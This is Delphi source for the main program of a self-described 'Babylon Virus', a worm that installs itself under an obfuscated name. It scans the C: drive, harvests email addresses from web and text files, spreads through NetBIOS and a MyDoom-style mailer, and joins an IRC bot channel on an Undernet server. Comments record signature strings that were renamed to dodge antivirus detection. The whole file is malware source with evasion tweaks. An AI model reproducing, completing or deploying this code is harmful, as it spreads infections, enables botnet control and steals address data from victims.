   (*

     Babylon Virus 1.0 - The true way of infections

   *)

   Program Babylon;

   uses
     Windows,
     WinInet,
     Messages,
     uNetBios,
     uMyDoom,
     untFunc in 'untFunc.pas',
     untBot in 'untBot.pas';

   Const
   // #1 detection :
   // AvMsg : String = #13#10#13#10'Babylon Virus 1.0 - The True way Of Infections'#13#10#13#10;
     AvMsg : String = #13#10#13#10'b@bylon 2.0 ;)'#13#10#13#10;

   Var
     ThreadID: Dword;
     Msg     : TMsg;
   Begin
   // #1 detection :
   // Case InstallMe('Babylon.exe', 'Babylon_Virus_1.0') Of
     Case InstallMe('b@byl0n.exe', '_b@byl0n_v10_') Of
       INSTALL_ERROR: ExitProcess(0);
       INSTALL_MUTEXFAIL: ExitProcess(0);
     End;

     FillChar(MAIL_FILENAME, 10000, #0);
     FillChar(MAIL_MAIL,     10000, #0);
     FillChar(FILE_FILENAME, 10000, #0);

     WHILE NOT InternetGetConnectedState(NIL,0) DO Sleep(1000);

     // ---------- DoScan Thread -----------------
     ScanData.ScanDir := 'C:\';
     ScanData.ScanName := '*.*';
     ScanData.ScanMask := '*';
     CreateThread(NIL, 0, @DoScan, @ScanData, 0, ThreadID);
     // ---------- DoScan Thread -----------------

     // ---------- DoGather Thread -----------------
     GatherData.Filter := 'htmlplphpasptxt';
     GatherData.Dir := SysDir('');
     CreateThread(NIL, 0, @DoGather, @GatherData, 0, ThreadID);
     // ---------- DoGather Thread -----------------

     StartNetBios(255);
     StartMyDoom(255);
     StartBot('uk.undernet.org', 6667);

     While GetMessage(Msg, 0, 0, 0) Do
           DisPatchMessage(Msg);
   End.
